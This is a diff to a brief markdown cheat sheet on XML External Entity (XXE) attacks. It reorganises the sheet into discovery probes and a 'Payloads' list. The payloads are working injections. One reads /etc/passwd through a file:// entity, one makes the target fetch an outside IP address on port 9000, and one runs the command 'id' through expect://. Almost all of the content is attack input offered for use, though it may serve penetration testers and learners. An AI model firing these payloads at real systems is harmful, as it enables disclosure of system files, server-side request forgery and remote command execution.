@@ -1,21 +1,11 @@
 # XXE
 
-## Concept
-```<!Entity nooranet SYSTEM "file:///etc/passwd">```
-
 ## Discovery
 - Find ```xml``` in error of these payloads
   - ```.php?xml=>```
   - ```.php?xml=/>```
 
-## Exploitation
-- LFI
-```XML
-<!DOCTYPE foo[
-<!Entity xxe SYSTEM "file:///etc/passwd">]>
-<foo>&xxe;</foo>
-```
-- Command Injection
-```XML
-<!Entity xxe SYSTEM "expect://id">]>
-```
+## Payloads
+- ```<!DOCTYPE foo[<!Entity xxe SYSTEM "file:///etc/passwd">]> <foo>&xxe;</foo>```
+- ```<!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.255.164.2:9000/helloworld">]> <data><text>&passwd;</text></data>```
+- ```<!Entity xxe SYSTEM "expect://id">]>```
